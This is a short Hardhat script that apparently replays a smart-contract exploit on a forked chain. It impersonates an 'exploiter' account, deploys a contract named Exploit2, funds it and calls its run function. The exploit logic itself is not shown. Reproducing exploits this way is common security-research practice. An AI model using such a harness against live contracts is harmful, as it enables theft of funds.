const [addresses, forkFrom, impersonate] = require('../utils/utils.js');

async function main() {

    impersonate(addresses.exploiter);
    const attacker = ethers.provider.getSigner(addresses.exploiter);
   

    // We get the contract to deploy
    const Exploit = await ethers.getContractFactory("Exploit2");
    //const val = ethers.utils.parseEther(1).toString();
    const exploit = await Exploit.deploy();
    console.log("Exploit deployed to:", exploit.address);
  
    attacker.sendTransaction({
        to: exploit.address,
        value: 10
    });
    
    await exploit.run(2, {gasLimit: 82000000, gasPrice: 99});

  }
  
  main()
    .then(() => process.exit(0))
    .catch(error => {
      console.error(error);
      process.exit(1);
    });